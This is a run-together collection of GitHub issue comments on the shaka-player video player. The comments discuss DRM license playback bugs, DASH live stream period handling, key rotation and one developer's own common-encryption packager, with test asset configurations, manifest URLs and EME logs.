license won't be issued in your environment (VM, it doesn't like your cable, something like that possibly?)  Although I couldn't tell you what that specific error code means.\nI made a very simple test asset that can demonstrate the issue and possibly bypass license restrictions.  I am going to use the MS test license server (test.playready.microsoft.com) and pass the keys via URL parameters as well as adding a playenabler that should allow for playback on a VM.   Additionally I will set the security level down to 150, which is, I think, the lest restrictive level.  Hopefully this should play just about anywhere, AND it still duplicates the issue.  If the license takes more than 200ms to come back, you will see the playback error described.   I just tested it on a VM (as the Axinom tests wouldn't play on a VM) and was able to reproduce the issue, although it is hard to get the license request to take more than 200ms.  You might need to do some network latency injection to get it to happen on a reliable basis.\njs\n  {\n    name: 'PR - Two Simple keys (one audio one video) test.playready.microsoft.com as license server', //gjslint: disable=110\n    manifestUri: 'https://content.uplynk.com/dea42163a7b3496980412632266237ab.mpd?rays=g', // gjslint: disable=110\n    encoder: shakaAssets.Encoder.UPLYNK,\n    source: shakaAssets.Source.UPLYNK,\n    drm: [\n      shakaAssets.KeySystem.PLAYREADY\n    ],\n    features: [\n      shakaAssets.Feature.MP4,\n      shakaAssets.Feature.PSSH,\n      shakaAssets.Feature.HIGH_DEFINITION\n    ],\n    licenseServers: {\n      'com.microsoft.playready': 'https://test.playready.microsoft.com/service/rightsmanager.asmx?cfg=(kid:nGI+4kw9N0W/aB8Q99Px8Q==,sl:150,contentkey:EREREREREREREREREREREQ==,playenablers:(786627D8-C2A6-44BE-8F88-08AE255B01A7)),(kid:o6CBo3JY+kiwce+S5s2Zsw==,sl:150,contentkey:MzMzMzMzMzMzMzMzMzMzMw==,playenablers:(786627D8-C2A6-44BE-8F88-08AE255B01A7))' // gjslint: disable=110\n    }\n  },. I am still using:\nWindows 10 Pro - Version 1703 - OS Build 15063.674\nMS Edge 40.15063.674.0 edgeHTML 15.15063\nThis is unchanged from my previous tests -- Windows update doesn't seem to be giving me anything newer (like the v1709 mentioned in the previous comment).. @joeyparrish it looks like edge must have fixed something indeed.  I cannot duplicate with edge16 either.  Sorry to waste your time on this.  Windows 10 apparently has the \"Fall creators update\" which includes edge 16 and came out on 10/17/2017.  I had to manually find and run the update to get it though. I am not sure when that will come through windows update.\nNow that I have this worked out I am probably going to put together a pull request for you with VDMS MultiDRM content for the demo app if you are open to that.. Yeah, done.  . Testing on chrome and edge looked good, but I happened to test on firefox and discover an issue with playback.  After further investigation it looks like there was a problem with the encoding that has broken playback on firefox.  I will re-submit after the encoder problem gets fixed.. Yes, I will leave that asset be for as long as you need it.. Ok, Looks good to me.  I tried it in the 2.2 and 2.3 branches and issue seems to be gone.  Thanks for looking into it.\n. So I tried both of these out on what is currently in the 2.2 and 2.3 branches.  In both cases the first now plays, but the second does not.  So If the cause of that is a duplicate of 1232 then you can close if you like.  If you want to notify me when 1232 has a fix I can retest this asset and be sure it is working.  However you want to handle it.. I built it out of master and it appears to be working.\nI built v2.3.x and the problem is still there.  I am assuming the fix is only in master.. > Maybe this is a silly question, but if you know the ad period is 73.045 seconds, why not put that in the ad period's duration attribute?\nThe answer to that is that I don't know the actual duration when the period starts.  In my test case I personally know that I am going to end it at 73.0.45 seconds, but we don't require people signaling an ad break in a stream to tell us exactly when it will end when they start it.\nReferring to \"Guidelines for Implementation: DASH-IF Interoperability Points\" at http://dashif.org/w/2015/04/DASH-IF-IOP-v3.0.pdf\nI think section 4.4 actually says it pretty well, and I am leaning on that section quite a bit when it comes to what I am expecting the player to do here.  Specifically many of the \"Backgrounds and Assumptions\" in 4.4.1 hold true in this case.\n\nI haven't re-read the spec or IOP since we started this conversation, but that's not how we interpret it. We treat minimumUpdatePeriod as how often to update the manifest, period. It doesn't have anything to do with the length of a period.\n\nWell, give the name \"minimum update period\" that makes perfect sense, but my reading of the spec seems to suggest that it also has a dual purpose when the last period in the manifest has an unknown duration.\n\n4.3.2.2.4.\nPeriod Information \nEach Period is documented by a Period element in the MPD. An MPD may contain one or more Periods. In order to document the use of multiple Periods, the sequence of Period elements is expressed by an index i with i increasing by 1 for each new Period element. Each regular Period i in the MPD is assigned a\n \u2022 Period start time PSwc[i] in wall-clock time, \n \u2022 Period end time PEwc[i], in wall-clock time. \nNote: An MPD update may extend the Period end time of the last Period. For details refer to section 4.4.\n\nThat last line is the most important one here and has me looking to 4.4\nSpecifically 4.4.2.2\n\nIf the Period is the last one in the MPD and the MPD @minimumUpdatePeriod is\npresent, then the time PEwc[i] is obtained as the sum of NOW and the value of MPD @minimumUpdatePeriod.  Note that with the MPD present on the server and NOW progressing, the Period end time is extended.\n\nSo it seems to me in the case of an unknown final period duration, the minimum update period provides a cap on how many segments can be downloaded.    \nSpecifically the way I interpret is this:\nI will have a given window of segments I know about on any given MPD update.  Say at one point in time I know that one period ends 15 seconds through the window, but I don't have an end time for the second period.  I will put the second period in with the appropriate start time and then set the minimum update time to 15 seconds. That 15 seconds should be the cap on the number of segments that a player will download.\nSo when you say:\n\nUntil the next content period appears, periodDuration here is null, so there is no cap on the segments we think we can find in that period.\n\nThat feels wrong to me from what I am reading.  I don't think it should be uncapped.   I believe the min period update is supposed to provide a cap in this instance.\nI could put a duration on the final period in the mpd trying to limit what is downloaded before the next update, but that doesn't seem to be the way that the spec says periods of unknown duration should be handled, and I would also have to just keep increasing that duration potentially after every update.  \nLet me know how you interpret this.\n. So I am going to take back the comments I made earlier about having a stream that actually duplicated this easily, as I had a bad time sync server URL that caused me other problems.   For now let's just talk about this in terms of the spec and what you have already said about Shaka's behavior (uncapped download), vs what I think the spec says should be happening (cap final period based on minimumUpdatePeriod).  .  I am having trouble getting a stream that reproduces ONLY that issue, but I have managed to get pretty close with this.  There is some additional issues with transitioning between assets, largish gaps, that don't seem to be jumped even with large gap jumping enabled for example, but whenever I reload the MPD it start playing again, which tells suggests to me I am at least pretty close (as in If I start on the period playback will work, but if I am transitioning into it from a previous period it does not).\nThis asset doesn't ALWAYS show the error the issue with downloading beyond the end of the segment, but it does pretty frequently on asset transition.  The error seen as a 403 fetching a segment that doesn't exist because it is beyond the end of the segment, as described by the body of the initial entry to this bug.\nThis stream inserts a 118 second break every 5 minutes.  This break is filled mostly by a movie trailer and then a couple seconds of \"Ad Slate\".   \n{\n  name: 'Downlynk Dash Live with Ad Breaks - duswqa1',\n  manifestUri: 'https://content-duswqa1.downlynk.com/channel/29e9c85c070f413fb71a3b2a39eed208.mpd?ad=dashad', // eslint-disable-line max-len\n  encoder: shakaAssets.Encoder.UPLYNK,\n  source: shakaAssets.Source.UPLYNK,\n  drm: [\n    shakaAssets.KeySystem.WIDEVINE,\n    shakaAssets.KeySystem.PLAYREADY\n  ],\n  features: [\n    shakaAssets.Feature.MP4,\n    shakaAssets.Feature.PSSH,\n    shakaAssets.Feature.MULTIKEY,\n    shakaAssets.Feature.HIGH_DEFINITION\n  ],\n  licenseServers: {\n    'com.microsoft.playready': 'https://content-duswqa1.downlynk.com/pr',\n    'com.widevine.alpha': 'https://content-duswqa1.downlynk.com/wv'\n  },\n  requestFilter: shakaAssets.UplynkRequestFilter,\n  responseFilter: shakaAssets.UplynkResponseFilter\n},. Ok, it wasn't clear to me that I should not reuse period ID's - In fact I thought I was supposed to because of what was referred to as \"Continuous Period Offering\" in the IOP.  I made a period ID change (to make period IDs unique) and I think I fixed the PTO issue as well, and now that stream seems to be playing pretty well.  I guess what must have been happening was that the second period with a given id was ignored as you suggested and we must have kept downloading slices derived from the first period with a given ID to end up downloading beyond where we should have been.  In any case I think that solves my current problem.  Thanks!. I actually believe it is a bug to drop a period because it has the same identifier btw.  I believe the IOP describes valid situations in which this is done in section 3.2.12, but I am more interested in having thing play than in worrying specifically about the spec.  So I have changed my periods ids to be unique, now that they are things are playing so I am happy, but you might want to consider that this could be a valid use case.\n\n. Well, anytime the period id and the period start time were the same in my content, that meant it was the same period.  If the period id was the same and the start time changed, that meant it was a new period, but it was continuous with the previous one that had the same id.. Ok, I misread that.  I conceed that it does appear that period ids are required to be unique.. It looks exactly like #1094 actually.  I hadn't noticed that issue as it was closed.  If I read that issue correctly, a fix was applied to setup the EME if license server config suggested that protected content would be provided.  I do have license servers setup in the player config, so the provided fix should fix my issue?  The EME log does show some activity when I start during an unencrypted ad period, but still no license is requested when the protected period shows up.  I update master just this morning to ensure I had everything.   So I have the code that is supposed to provide the fix, yet this issue persists.  \neme_start_on_drm_protected_asset.log\neme_start_on_unencrypted_asset.log\n. Just checked out the v2.3.x branch and verified the same issue occurs there also.\nPerhaps any new license is a problem.  I create a new test live stream that starts with encrypted content and then every 3 minutes a new period with new encryption keys starts.  This would require a new license to be requested.  I am watching the network pane, and I am sure that never happens.  Because of this playback dies at the period boundary.  It basically looks the same as when the live stream starts on a unencrypted period.  So perhaps this has nothing specifically to do with starting on a unencrypted period, just a failure to request new licenses as they are required.\n{\n  name: 'Live New Asset / New Key Every 3 Min',\n  manifestUri: 'https://content-duseqa1.downlynk.com/channel/40b7f8553f6a41a7a1c00b0147b5618a.mpd', // eslint-disable-line max-len\n  encoder: shakaAssets.Encoder.UPLYNK,\n  source: shakaAssets.Source.UPLYNK,\n  drm: [\n    shakaAssets.KeySystem.WIDEVINE,\n    shakaAssets.KeySystem.PLAYREADY\n  ],\n  features: [\n    shakaAssets.Feature.MP4,\n    shakaAssets.Feature.PSSH,\n    shakaAssets.Feature.MULTIKEY,\n    shakaAssets.Feature.HIGH_DEFINITION\n  ],\n  licenseServers: {\n    'com.microsoft.playready': 'https://content-duseqa1.downlynk.com/pr',\n    'com.widevine.alpha': 'https://content-duseqa1.downlynk.com/wv'\n  },\n  requestFilter: shakaAssets.UplynkRequestFilter,\n  responseFilter: shakaAssets.UplynkResponseFilter\n},\n\n. The PSSH data on these streams only exists in the manifest, and not in the init segments at all.  So in that sense it is slightly different than what seems to be describe in #1107.  Taking the PSSH data out of the manifest wouldn't solve anything as appears to be the case with 1107.  Other than that, it does look like it would be a very similar issue. . Is this on the radar anywhere?  Scheduled to be looked at for any particular targeted release, etc?. So -- I just pulled from master and built this morning, but It doesn't seem to be working quite right -- When the key change comes up I do see this in the console log:\n     VM1663:418 emeLogger.CreateSessionCall\u00a0{timestamp: \"11:0:49:804\", title: \"CreateSessionCall\", \n    target: MediaKeys, returned: e\u2026r.MediaKeySession, sessionType: \"temporary\"}\n    VM1663:418 emeLogger.GenerateRequestCall\u00a0{timestamp: \"11:0:49:804\", title: \n    \"GenerateRequestCall\", target: e\u2026r.MediaKeySession, returned: Promise, initDataType: \"cenc\",\u00a0\u2026}\n    VM1663:418 emeLogger.CreateSessionCall\u00a0{timestamp: \"11:0:49:805\", title: \"CreateSessionCall\", \n    target: MediaKeys, returned: e\u2026r.MediaKeySession, sessionType: \"temporary\"}\n    VM1663:418 emeLogger.GenerateRequestCall\u00a0{timestamp: \"11:0:49:807\", title: \n    \"GenerateRequestCall\", target: e\u2026r.MediaKeySession, returned: Promise, initDataType: \"cenc\",\u00a0\u2026} \n    VM1663:418 emeLogger.PromiseResult\u00a0{timestamp: \"11:0:49:810\", title: \"GenerateRequestCall \n    Promise Result\", status: \"resolved\", args: Array(2)}\n    VM1663:418 emeLogger.PromiseResult\u00a0{timestamp: \"11:0:49:813\", title: \"GenerateRequestCall \n    Promise Result\", status: \"resolved\", args: Array(2)}\n    VM1663:418 emeLogger.MessageEvent\u00a0{title: \"MessageEvent\", event: MediaKeyMessageEvent, \n    timestamp: \"17:20:7:398\", target: e\u2026r.MediaKeySession, message: Uint8Array(2),\u00a0\u2026}\n    VM1663:418 emeLogger.UpdateCall\u00a0{timestamp: \"11:0:50:38\", title: \"UpdateCall\", target: e\u2026 \n    r.MediaKeySession, returned: Promise, response: Uint8Array(716),\u00a0\u2026}\n    VM1663:418 emeLogger.PromiseResult\u00a0{timestamp: \"11:0:50:151\", title: \"UpdateCall Promise \n    Result\", status: \"resolved\", args: Array(1)}\n    VM1663:418 emeLogger.MessageEvent\u00a0{title: \"MessageEvent\", event: MediaKeyMessageEvent, \n    timestamp: \"17:20:7:738\", target: e\u2026r.MediaKeySession, message: Uint8Array(4036),\u00a0\u2026}\n    VM1663:418 emeLogger.UpdateCall\u00a0{timestamp: \"11:0:50:368\", title: \"UpdateCall\", target: e\u2026 \n    r.MediaKeySession, returned: Promise, response: Uint8Array(569),\u00a0\u2026}\n    VM1663:418 emeLogger.PromiseResult\u00a0{timestamp: \"11:0:50:433\", title: \"UpdateCall Promise \n    Result\", status: \"resolved\", args: Array(1)}\n    VM1663:418 emeLogger.KeyStatusesChangeEvent\u00a0{title: \"KeyStatusesChangeEvent\", event: \n    Event, timestamp: \"17:20:8:19\", target: e\u2026r.MediaKeySession}\nBut video hangs at the point the key change occurs.  Interestingly if I wait for a bit the audio does start playing again (when the playhead is moved to the back of the TSB), but video never recovers.  Is it possible that only the audio key was peroperly rotated?\nThis is the stream I tested it on this morning.  Key rotates every 3 minutes: \nhttps://content.uplynk.com/channel/3ff06a21737f40bd9f0e3bc342a4ca6b.mpd?prettydash=1\nhttps://content.uplynk.com/wv\n. So, I was able to create a couple of test streams that demonstrate adding new encryption info successfully and unsuccessfully when moving from unencrypted to encrypted in Shaka player.  I figured you guys would be interested in seeing it, as it has been hit and miss for me whether this transition works:\nThese streams are the same live stream, but I start with a different preroll sample ad (unencrypted) in each case.  With one specific sample ad I see Shaka report Dropping Variant (not compatible with key system, platform, or active Variant) (for every single variant) in the console when the first encrypted period shows up from the test content.  The demo app then reports \"Unplayable Period\" and playback soon fails.\nmanifest URL: https://content.uplynk.com/channel/3c367669a83b4cdab20cceefac253684.mpd?ad=koolaid&drm_optional=1&ad.preroll=1&prettydash=1\nlicense URL: https://content.uplynk.com/wv\nNow If I just start with a different ad:\nmanifest URL: https://content.uplynk.com/channel/3c367669a83b4cdab20cceefac253684.mpd?ad=onead&drm_optional=1&ad.preroll=1&prettydash=1\nlicense URL: https://content.uplynk.com/wv\nStarting with this ad does almost the same thing when the first encrypted period shows up:\nDropping Variant (not compatible with key system, platform, or active Variant) shows up, but not for every variant.  It drops most of them, but leaves a couple so that the next period is not considered unplayable, and the playback successfully continues.\nWhy is Shaka dropping variants when moving from unencrypted to encrypted periods, and why does it sometimes leave some variants when it moves from unencrypted to encrypted?\nThis seems relevant to this particular bug, so I thought I would post this info here, but perhaps it deserves a different bug.\nOne note on the test streams -- These streams have random ad breaks in them, so if you happen to start with a preroll ad in an ad break you will see the ad twice in a row.  If you see the sample ad twice in a row you need to restart playback to duplicate the issue.  I have no way to ensure that you aren't in an ad break when you start, so occasionally you won't be able to replicate - Just be aware.\n. I feel like different avc1 codecs strings wouldn't count as codec switching for the MSE just as joey mentioned here that different mp4a codecs strings wouldn't count. \nhttps://github.com/google/shaka-player/issues/1567#issuecomment-417939500\nIt isn't like we are switching from avc1 to hevc or something.  The issue does seem to be covered by #1567 though.\n. So I am not seeing the problem I saw when I first tested your fix.  The problem of video hanging where the key change occurred.  I have tested this in 2.5 and 2.4, and I think it is fixed.  The other issue I thought might have been related appears to have its own bug #1567.  I think this one can be closed as fixed. . Just want to leave a +1 on this one.  We have two features we really hope make it into Shaka 2.5 and this is one of them. -- The other is the support for key rotation in the manifest.. I have another live test stream that you can validate against here if it is useful:\nmanifest url:     https://content.downlynk.com/channel/34b1b0717d9d44f6809c89ab130a16bf.mpd\nlicense server: https://content.downlynk.com/wv. no difference. It is extremely easy to reproduce by just using the manifest urls provided.. Oh tricky.... Thanks so much for looking at this.   I have a fix I am going to deploy for this very shortly.  I figured it was possible that it was an issue with the manifest, but I am just couldn't see what it might be.. Yes, thank you very much for the info. I will see if anyone in our org has some contacts at MS. Maybe we can emphasize how useful this documentation would be for us. It will make testing persistent PlayReady licenses much easier for us.. We have a default widevine policy for our license server.  This policy is to issue non persistent licenses, so this is not unexpected.  Our license server can issue persistent licenses, but we do not do that by default.  For the purposes of the demo player we can issue a persistent license though.  That would probably avoid people re-submitting this bug over and over.   If we simply add rmp.policy_overrides.can_persist=True to the mpd url as a parameter, then our license server should issue a persistent license and storing will then be possible.. Done. Done -- Added the \"UPLYNK\" encoder so I could specify that in these assets.. Done. Done. Done -- I also added shakaAssets.Feature.MULTIPLE_LANGUAGES as I was reviewing the features.  This asset has a second Portuguese audio track.   We could add a new feature for assets like this that have completely clear periods interspersed with encrypted periods too.  I believe you haven't had many tests like this up to this point because of Chrome's issues supporting it until 58.\n. ",
    "michellezhuogg": "The root cause:\nIE11 doesn't support the second parameter of toggle() method. \nhttps://github.com/google/shaka-player/blob/master/demo/controls.js#L553\nhttp://caniuse.com/#search=classList\n. @joeyparrish Could you take a look to see if we should add the feature?. Could you please add a manifest URL that reproduces the issue?\n. This should work after the fix is commited:\njs\nconst startTime = 500;\nplayer.load(asset.manifestUri, startTime).then(function() {\n    const end = player.seekRange().end;\n    if (startTime > end) {\n      player.getMediaElement().currentTime = 0.1;\n    }\n});. Not able to reproduce the assertion fail, however, both switchVariant_() and switchTextStream_() are called when switching audio language. . @joeyparrish Could you please take a look?. Reproduced the bug, will work on the fix.. @BucherTomas, I have reproduced and confirmed the bug, and scheduled it for v2.4. We will attend to it as soon as we can.\n. What manifest did you use? \nCould you please describe the steps to reproduce the issue? Thank you!\n. I tried to reproduce the issue with network throttling, but could not see the exception. \nCould you please provide more detailed instructions to reproduce the issue, or some sample code? You may send it to shaka-player-issues@google.com if you prefer to keep it private.. Shaka Player doesn't really interact with Web Audio API, and doesn't support streaming two audio tracks at the same time so far.\nHowever, to implement crossfading, you can have multiple Player instances, so that you can have two tracks streaming at the same time.\nIf you have any specific questions when implementing crossfading, let us know and we'd love to help.. @sergioavazquez \n6001 Error is REQUESTED_KEY_SYSTEM_CONFIG_UNAVAILABLE, and can be cause by these reasons mentioned in the document.\nIs there any specific reason that you're forcing https on your localhost? Plain http should work for localhost.\n. @sergioavazquez \n6001 Error is REQUESTED_KEY_SYSTEM_CONFIG_UNAVAILABLE, and can be cause by these reasons mentioned in the document.\nIs there any specific reason that you're forcing https on your localhost? Plain http should work for localhost.\n. Hi @TobbeEdgeware ,\nThank you for reporting this! I am able to reproduce this issue in Chrome on MacOS, but not in Firefox on MacOS or linux. We will work on fixing it!\n. @joeyparrish Are we going to add this?. Could you please test with our lately build https://nightly-dot-shaka-player-demo.appspot.com/ ?. I'm able to reproduce it. We'll work on fixing this issue.. Hi, thanks for reporting this issue, and we appreciate if you can send a test file so that we can reproduce it. You can send it to us privately through email: shaka-player-issues@google.com. Thank you!. Hi, thanks for reporting this issue, and we appreciate if you can send a test file to reproduce it. You can send it to us privately through email: shaka-player-issues@google.com. Thank you!. Found that Latest nightly build skips the first period while v2.4.4 doesn't. Will work on fixing this.. As we tested for the captions button, the screen reader would read as \"captions, button-English\", which is hard to understand. Keeping it the way it is right now.. https://www.w3.org/TR/wai-aria-practices/examples/dialog-modal/dialog.html. Hello @salmoro , I am seeing 'Invalid Token' from the link you sent us via email. Is your content still available for testing?. I am able to see CEA-608 closed captions in our demo. Do you have mux.js loaded?\nhttps://nightly-dot-shaka-player-demo.appspot.com/demo/#asset=https://d2rghg6apqy7xc.cloudfront.net/dvp/test_dash/005/unencrypted/montereypop_16_min_2265099.mpd. Hello @macoybarayan , I am not able to reproduce your issue in Safari on Macbook. Did the green background appear with a specific version of Safari?. I was using the same version of Safari. And now it seems I don't have access to the content anymore.. Hello @kevinscroggins-youi , we don't have access to your content. Do you have it whitelisted?. Confirmed the bug. In Chrome, it shows two kinds of error messages, either 'Initialization segment misses expected aac track', or 'MANIFEST.HLS_COULD_NOT_PARSE_SEGMENT_START_TIME'. In Firefox, it shows 'Initialization segment misses expected aac track'.\nFurther investigation needed.. Hello @MilosRasic ,\nI tried to play the content https://dai1.xumo.com/a7ze70ah55wn6lu4/9999243/master.m3u8 with hls.js, and it's not loading successfully. Could you please confirm that? Thank you!. ",
    "jide": "Hi,\nAccording to changelog https://github.com/google/shaka-player/blob/master/CHANGELOG.md, a basic support for xlink has been implemented.\nIt references this issue, #587, but the mpd uri provided as an example there does not work, although it only uses xlink:actuate=\"onLoad\".\nAny idea why ?. ",
    "surig": "sorry, I mean regarding chromecast demo app, i tried axinom drm content it is working fine from chrome shaka chrome browser.\nI would like to check how to pass the parameters to receiver like license url , token with header message and content type ,If i want to send a sender request from android or IOS device with default android / IOS sender app.. ",
    "ducntrinh": "@TheModMaker Thank you very much for your detailed answer. I'm gonna close the issue.. ",
    "pszemus": "Hi @joeyparrish\nI thought the same untill I tried VLC and DASH-IF players that can play that stream as a video-only stream. Nevertheless it's not a bug nor regression, but a feature to consider.. I've created a question in Wowza Streaming Engine forum that's read by the support team, let's wait and see what happens.\nhttps://www.wowza.com/community/questions/46529/audiovideo-synchronization-issue-on-multicast-fram.html. ",
    "ut0mt8": "\n\nCan you reproduce the issue with our latest release version?\nYep with v2.1.1-debug.\n\n\nCan you reproduce the issue with the latest code from master?\nNot tested.\n\n\nAre you using the demo app or your own custom app?\nYep with the demo on your website.\n\n\nIf custom app, can you reproduce the issue using our demo app?\nN/A\n\n\nWhat did you do?\nTesting my manifest :) Load in the custom manifest form\n\n\nHow did you interact with the content, if at all?\nN/A\n\n\nWhat did you expect to happen?\nThe video playing :)\n\n\nWhat actually happened? (Please include error messages/codes)\nNothing. The mpd is fetched, and seems to be reloaded.\nBut no chunk are downloaded, so ..\nNothing in the console..\n\n\n. Sorry for the late response. The link should be ok now. I have to make it more stable; but this should be testable.. Ok for the mixed content it's just a matter of configuration. I fix it.\nI use my own fork of nginx-rtmp-module, but I don't change this part.\nI can confirm is that the servers is ntp synchronized. \nThe avaibilityStartTime is correct; the timeShiftBuffer also.\nLive example : \navailabilityStartTime=\"2017-06-13T14:57:27Z\"\npublishTime=\"2017-06-13T14:57:27Z\"\nminimumUpdatePeriod=\"PT3.600S\"\nminBufferTime=\"PT2.000S\"\ntimeShiftBufferDepth=\"P0Y00M00DT0H01M30.000S\"\n\nFirst segment is : \n  \"2717229792\"  / 1000  (the timescale).\n3 days, 3 hours, 28 minutes and 42 seconds.\nI know this is the timestamp of the internal encoder (elemantal server). The video flux was restarted 3 day ago.\nWhat puzzle me, is that the same mpd work fine on dashjs or bitmotvin. \nAnd it start at the right time. \nHow it is supposed to be calculated ?\n. Ah and testing with and old release of shaka (as http://emmy9.casa.umass.edu/shaka-player/ shaka-1.6.2) the flux is OK.  ?!. Bug in elemental or in nginx-rtmp.\nAnother manifest (https://ec2-52-56-93-145.eu-west-2.compute.amazonaws.com/dash/live_hi/index.mpd) on the same input flux but transcoded by ffmpeg is ok.\nI have to dig on why elemental send these king of timestamp (which correspond to nothing, perhaps a TS coded in the SDI original flux ?).\nAnd I have to dig on why nginx-rtmp in this case honor the ts in rtmp, while it start at zero with ffmepg rtmp flux (which it ok).\n. I finally found was going wrong.\nElemental Live Server sending onFi amf event (with what is supposed a Timecode) which completely broke the timestamp gestion of nginx-rtmp.\nDisabling sending onFi event and selecting \"starting a 0\" timecode start produce a correct timeline...\nI will make Elemental a report ; I'm really curious what is this supposed timecode (because it correspond to nothing).\nAnyway I think we can close this issue as It is nothing to do with shaka-player.\nThks. . Hello and thank for the response I really appreciate.\nIf you have worked on common encryption a lot I think you are the good person to help me.\nPerhaps we could use another place to talk on that ?\n1) I cannot use any existing packager (or I should patch) because we already use a patched version (by myself) of nginx-rtmp which handle scte35 message to pass it as emsg box. And this is very specific to our encoder (elemental). That said if something exist to repackage dash to encrypted dash on the fly I take.\nThis is why I'm begin to code it (and for the fun).\n2) Having clear and encrypted media of the same fragment should be feasible, but this is not trivial.\nThe problem is that we are on live stream so, I have to patch my code to write both flavours. I was thinking of that from the beginning but the structure of the code does not make it simple.\nSo when done I can provide both init and fragment clear and encrypted.\n3) I'm pretty sure it encrypt. When hexdumping I saw pure garbage(crypted stuff) in mdat. AND.\n- the fragment was unplayable BUT decrypting it with mp4decrypt from bento4 tool with the good kid:key gave me a correct fragment playable with vlc ! this is why I think I have not mode complete crap. On the other side MP4Box cannot decrypt it correctly ?!\n4) I will check how using EVP_aes_128_ctr (I think I have tried it and it did not make what I want but I could be wrong.) On the code my principal inspiration was the kaltura-vod-module and the ISO spec. \nCouple of other questions : \n\n\nI did not make sub-sample encryption for video track for the moment. I know this is a Must in the spec but did that make a difference in the end ? I know that some packager (USP for example) did not that too, and content is playing.\n\n\nDid you know any other tool to test the conformity of my stuff ? how can I debug more precisely the browser side (EME, CDM, etc...) ?\n\n\nThank you.\n. @theodab thank for pointing it. I've fixed it. And also the content of the pssh box in base64 which it incorrect.. @TheModMaker \nNo my code doesn't support vod but I already test streaming in rtmp from ffmepg , something like : \nffmpeg  -re -fflags +genpts -stream_loop -1 -i video-fixed.mp4 -vcodec copy -acodec copy -f flv rtmp://localhost/live/live\nThis is the classic big buck bunny mp4, but with fixed GOP size at 50 frames (better for streaming).\nSo theoretically I can compare part of the initial file with resulted encrypted fragment. But I will try to generate clear fragment in the right order , to facilitate debugging.\nfor mp4decrypt : I've just retry on my local mac, so download init and one fragment, concat and it work.\n$ wget https://aws.futomaki.net/dash/live/init.m4v\n$ wget https://aws.futomaki.net/dash/live/526480.m4v\n$ cat init.m4v 526480.m4v >> test-enc.m4v\n$ ./Downloads/Bento4-SDK-1-5-1-623.universal-apple-macosx/bin/mp4decrypt --key 1:f00df00df00df00df00df00df00df00d test-enc.m4v test-dec.m4v \nand VLC can play it.\nOn the ffmpeg side : \n$ ./bin/ffmpeg -decryption_key F00DF00DF00DF00DF00DF00DF00DF00D -i test-enc.m4v test-ff.m4v\ngave me no error, and it is also playable in VLC. \nThe only thing that is strange is that the resulting file is half the size, I imagine that ffmeg re-encode it. \nAnyway this is encouraging no ? (on the other hand I don't understand why you didn't have the same result ?)\n. @TheModMaker Ah I was sure I made a mistake here. \nSo to my understanding the offset in saio should be the difference between the beginning of the moof box (not including the moof box header) and the first IV in senc box ?\nSo In my case I calculate it as is : \n````\noffset = (saio_pos - moof_pos) + saio_box_size (12 header/version/flags + 4 entry_count + 4 entry offset)  + senc_size_header(12 header/version/flages + 4 sample_count).\n````` \nI miss something but what ? where is the 24 bytes missing ?. What a dumb :) good catch @TheModMaker !\nThe perfect typo. Difficult to find without an external eye..\nAgain thank you for the code review. I ve just fix it. (the code is bit crappy I know, I have to refactor/clean it).\nNow it work with mp4decrypt, ffmpeg both version, MP4box ! We progress.\nStill not work on any browser anyway (nor shaka or dashjs on chrome for example). Yes it work both with shaka-player and dashjs in firefox.\nAnd   it doesn't at all in chrome; perhaps full-sample encryption for the video is not supported...\nThe sound track should be working independently ? \nDid some Chrome-dev/other know that point ?\nAnyway let's implement the norm and see.\n. Update: \nI've just implemented sub-sample encryption and now it work with Chrome but not on Firefox...\n@TheModMaker what I was doing wrong this time. If you can keep an eye on it, your external viewpoint have been precious for now :)\nArgh my saiz should be wrong : I will correct it.\n. Quick status for followers and specially @TheModMaker. \nSo with sub-sample and an correct saiz box I ve got something which it close to work.\nThe only point is the size of the clear bytes at the beginning. Chrome seems to be very picky on that. For now I put an arbitrary big value. \nAnyway this is almost safe as I encrypt sufficient amount of data to prohibit viewing anything.\n. Again a big thanks for your support and patience.\nThe status is I have now a working implementation but still interoperability issue using clear key (I am in progress with widevine). \n\nShaka player : Chrome OK ; Firefox OK\nDashjs : Chrome NOK (?!) ; Firefox OK\n\nPS :  I knew about the norm about what to be crypted or not. (I got the ISO spec)\nI've made a naive implementation , leaving enough arbitrary bytes in clear at the begining and it do the trick (assuming there only one NALU per frame; which it my case). This seems ok.\nI think we could close here. I will continue on dashjs / chrome side.\n. When I started I was thinking I ve never get it to work and I am a fool to try to implement it. And finaly even with widevine it work. Just before the Word cup :) . ",
    "quiz1991": "@TheModMaker Thanks for the info!\nBut let's say my master playlist has two audio streams with different mimeTypes(like \"audio/aac\" and \"audio/mp4; ...\"), can I remove one audio sourcebuffer and create a new one after playback starts(i can make sure that only one audio sourcebuffer exists at the same time). @joeyparrish Thanks Joey!\nJust to share what we've experimented so far(on our own hls player):\n1. Adding more than one audio/video SourceBuffers inside onMediaSourceOpen: Parsed data \n    can be pushed into main audio and video SourceBuffer but playback cannot start\n2. During playback:\n    a. Removing SourceBuffer is ok\n    b. Adding SourceBuffer would cause QuotaExceedError. ",
    "hdodev": "Hi Joey. Yes it's very helpful thank you! I actually have the following responses. Both seems to be linked to CORS, if you can you please confirm.\n\n\nOn my manifest request I get: \nXMLHttpRequest cannot load http://IP@/m3gqlxmi5aaaaaaaa.../0000000/GlobalManifest.mpd.\nThe 'Access-Control-Allow-Origin' header has a value 'http://ip03.test.fr:9800' that is not equal to the supplied origin. Origin 'http://127.0.0.1' is therefore not allowed access.\n\n\nOn my license request I get:\nOPTIONS https://tb.licensedrm.fr:3443/v1/licenses (anonymous function) @ shaka-player.compiled.js:251Uf @ shaka-player.compiled.js:250B.g @ shaka-player.compiled.js:34 app-shaka.php:1 XMLHttpRequest cannot load https://tb.licensedrm.fr:3443/v1/licenses. Response for preflight has invalid HTTP status code 405\n\n\nI don't have access to server configuration, but I can ask for some configurations on the test bed. Do you please have some recommandations for 'Access-Control-Allow-Origin' and 'Access-Control-Allow-Headers' keys ? Put '*'? Put something more restrictive? Thanks.. Hi Joey, and thank you it's very clear. I will transfer these indications to the platofrm team.\nI close this item.. Hi Joey,\nFirst, thank you for your detailed analysis. This will allow us to move forward. OK, the \"mixed-content\" error is clear!\nJust to be sure to understand correctly, your conclusion is that for a absolute moment, the identified segment is not the same between successive manifests, as our timestamps are changing? Correct me please if I'm wrong.\nThen, I thought \"startNumber\" and \"suggestedPresentationDelay\" were DASH optional parameters, and that \"Period@start\" could not be fixed. So are they really required if we adjust the use of \"presentationTimeOffset\" with respect to our adjustment of \"Period@start\"? Correct me please if I'm wrong.\nThank you in advance (and sorry if my questions do not make much sense :-) ).. Hi Joey, thank you for this new answer. It' helpfull yes :-).\nI'll transfer this analysis and these additionnal notes to my Packager 